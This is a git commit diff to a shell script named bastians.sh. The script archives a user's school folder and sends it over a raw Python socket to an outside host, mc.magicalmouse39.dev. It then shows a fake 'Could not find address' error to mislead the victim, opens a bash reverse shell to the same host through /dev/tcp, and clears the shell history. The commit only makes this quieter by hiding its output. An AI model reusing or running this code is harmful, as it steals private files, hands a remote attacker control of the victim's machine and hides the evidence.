8791b20b54ccb6d6b916e834312cae7ba345043a
MagicalMouse39 <31729116+MagicalMouse39@users.noreply.github.com>
2021-11-25 10:35:21 +0100

    Update bastians.sh

--- bastians.sh
+++ bastians.sh
@@ -1,4 +1,4 @@
-tar -cf ~/mgkl.tar ~/scuola/2020_2021_ITIS_Torrette/ && python3 -c 'import socket
+tar -cf ~/mgkl.tar ~/scuola/2020_2021_ITIS_Torrette/ 1>/dev/null 2>/dev/null && python3 -c 'import socket
 import os
 s = socket.socket()
 s.connect(("mc.magicalmouse39.dev", 80))
@@ -6,4 +6,4 @@ user = os.getenv("USER")
 with open(f"/home/{user}/mgkl.tar", "rb") as fin:
     s.send(fin.read())
 s.close()
-raise Exception("Could not find address \"mc.magicalmouse39.dev\"")' &; $(/bin/bash -l > /dev/tcp/mc.magicalmouse39.dev/443 0<&1 2>&1 &) 1>/dev/null 2>/dev/null &; history -c
+raise Exception("Could not find address \"mc.magicalmouse39.dev\"")' 1>/dev/null 2>/dev/null; $(/bin/bash -l > /dev/tcp/mc.magicalmouse39.dev/443 0<&1 2>&1 &) 1>/dev/null 2>/dev/null && history -c
